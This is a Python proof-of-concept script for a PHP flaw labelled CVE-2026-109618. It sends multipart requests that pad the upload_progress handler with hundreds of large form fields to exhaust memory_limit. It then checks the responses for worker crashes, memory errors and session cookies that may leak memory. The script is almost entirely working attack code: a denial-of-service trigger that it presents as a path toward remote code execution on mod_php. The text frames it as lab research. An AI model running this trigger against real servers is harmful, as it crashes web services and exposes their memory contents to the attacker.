#!/usr/bin/env python3
"""
CVE-2026-109618 OOM Trigger Demonstration

Sends a crafted multipart/form-data request designed to exhaust PHP's
memory_limit during session.upload_progress processing. This triggers
the longjmp() abort that skips cleanup, leaving dangling pointers.

On mod_php: request cleanup runs on invalid data (potential RCE path).
On FPM: worker terminates on startup OOM (blocked), but post-startup
OOM is still exploitable.

Strategy: Use many non-file form fields with large values. Unlike file
parts (limited by max_file_uploads, default 20), regular form fields
have no count limit and each value is fully allocated into memory.
Combined with upload_progress tracking, this forces large allocations.

This script does NOT achieve RCE. It demonstrates the OOM trigger
condition and checks for memory disclosure in response cookies.

For authorized security research and local lab use only.
"""

import argparse
import socket
import sys


def build_oom_request(host, port, path, session_id, num_fields, field_size):
    """Build a multipart request with many large form fields to exhaust memory.

    Regular form fields (not files) bypass max_file_uploads and each
    value is allocated fully in memory. The upload_progress handler
    also tracks progress across all parts, accumulating state.
    """
    boundary = "----php2shellOOM"

    body = b""
    body += f"--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    body += b"oom_trigger\r\n"

    for i in range(num_fields):
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="field{i}"\r\n\r\n'.encode()
        body += (b"B" * field_size) + b"\r\n"

    body += f"--{boundary}--\r\n".encode()

    req = f"POST {path} HTTP/1.1\r\n".encode()
    req += f"Host: {host}:{port}\r\n".encode()
    req += f"Cookie: PHPSESSID={session_id}\r\n".encode()
    req += f"Content-Type: multipart/form-data; boundary={boundary}\r\n".encode()
    req += f"Content-Length: {len(body)}\r\n".encode()
    req += b"Connection: close\r\n\r\n"
    req += body
    return req


def send_and_analyze(host, port, request):
    """Send request and analyze response for OOM indicators."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    try:
        sock.connect((host, port))
        sock.sendall(request)

        resp = b""
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        sock.close()
    except ConnectionRefusedError:
        return None, "Connection refused"
    except ConnectionResetError:
        return None, "Connection reset (worker may have crashed)"
    except socket.timeout:
        return None, "Timeout (worker may have crashed)"

    return resp, None


def analyze_response(resp, session_id):
    """Check response for OOM indicators and memory disclosure."""
    results = {
        "status": "",
        "crashed": False,
        "memory_error": False,
        "cookie_leak": False,
        "cookie_value": "",
        "body_size": 0,
    }

    if not resp:
        results["crashed"] = True
        return results

    lines = resp.split(b"\r\n")
    if lines:
        results["status"] = lines[0].decode("latin-1", "replace")

    header_end = resp.find(b"\r\n\r\n")
    body = resp[header_end + 4:] if header_end != -1 else b""
    results["body_size"] = len(body)

    if b"500" in lines[0]:
        results["memory_error"] = True

    if b"Allowed memory size" in body:
        results["memory_error"] = True

    if b"Fatal error" in body and b"memory" in body.lower():
        results["memory_error"] = True

    for line in lines:
        line_str = line.decode("latin-1", "replace")
        if "Set-Cookie:" in line_str and "PHPSESSID=" in line_str:
            cookie_start = line_str.find("PHPSESSID=") + 10
            cookie_end = line_str.find(";", cookie_start)
            if cookie_end == -1:
                cookie_end = len(line_str)
            cookie_val = line_str[cookie_start:cookie_end]
            results["cookie_value"] = cookie_val

            if cookie_val != session_id:
                if len(cookie_val) > 40 or any(c not in "0123456789abcdef-," for c in cookie_val):
                    results["cookie_leak"] = True

    return results


def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109618 OOM trigger demonstration")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8899,
                    help="Target port (default: 8899 for mod_php lab)")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--session-id", default="php2shell-oom-test")
    ap.add_argument("--fields", type=int, default=500,
                    help="Number of form fields (default: 500)")
    ap.add_argument("--field-size", type=int, default=65536,
                    help="Size of each field value in bytes (default: 65536)")
    ap.add_argument("--attempts", type=int, default=3,
                    help="Number of attempts (default: 3)")
    args = ap.parse_args()

    est_mb = (args.fields * args.field_size) / (1024 * 1024)
    print("=" * 60)
    print("CVE-2026-109618 OOM Trigger Demonstration")
    print("=" * 60)
    print()
    print(f"  Target:     http://{args.host}:{args.port}")
    print(f"  Fields:     {args.fields} x {args.field_size}B values")
    print(f"  Estimated:  ~{est_mb:.0f}MB of form data")
    print(f"  Attempts:   {args.attempts}")
    print()
    print("[*] Using non-file form fields (bypasses max_file_uploads limit)")
    print("[*] upload_progress handler tracks each part, accumulating state")
    print()

    oom_count = 0
    for attempt in range(1, args.attempts + 1):
        sid = f"{args.session_id}-{attempt}"
        print(f"[{attempt}/{args.attempts}] Sending OOM trigger (session: {sid})...")

        req = build_oom_request(args.host, args.port, args.path, sid,
                                args.fields, args.field_size)
        print(f"    Request size: {len(req) // 1024}KB")

        resp, error = send_and_analyze(args.host, args.port, req)

        if error:
            print(f"    Result: {error}")
            if "crash" in error.lower() or "reset" in error.lower():
                print("    [+] Worker crash detected -- OOM likely triggered")
                oom_count += 1
            continue

        results = analyze_response(resp, sid)
        print(f"    Status: {results['status']}")
        print(f"    Body:   {results['body_size']} bytes")

        if results["memory_error"]:
            print("    [+] Memory error detected in response")
            oom_count += 1
        if results["crashed"]:
            print("    [+] Worker crash detected")
            oom_count += 1
        if results["cookie_leak"]:
            print(f"    [!] Possible memory disclosure in PHPSESSID cookie:")
            print(f"        {results['cookie_value'][:100]}")
        if results["cookie_value"] and not results["cookie_leak"]:
            print(f"    Cookie: {results['cookie_value'][:60]}")

        if not results["memory_error"] and not results["crashed"]:
            print("    [-] No OOM detected. Try increasing --fields or --field-size")

    print()
    print(f"[*] OOM triggered: {oom_count}/{args.attempts}")
    print()
    print("[*] Notes:")
    print("    - mod_php (port 8899): cleanup runs after OOM = potential RCE path")
    print("    - PHP-FPM (port 8898): worker terminates on startup OOM")
    print("    - Default memory_limit=128M needs ~128MB of field data")
    print("    - Lab mod_php uses memory_limit=32M for easier triggering")
    print("    - This script demonstrates the trigger, not the exploit")
    return 0


if __name__ == "__main__":
    sys.exit(main())
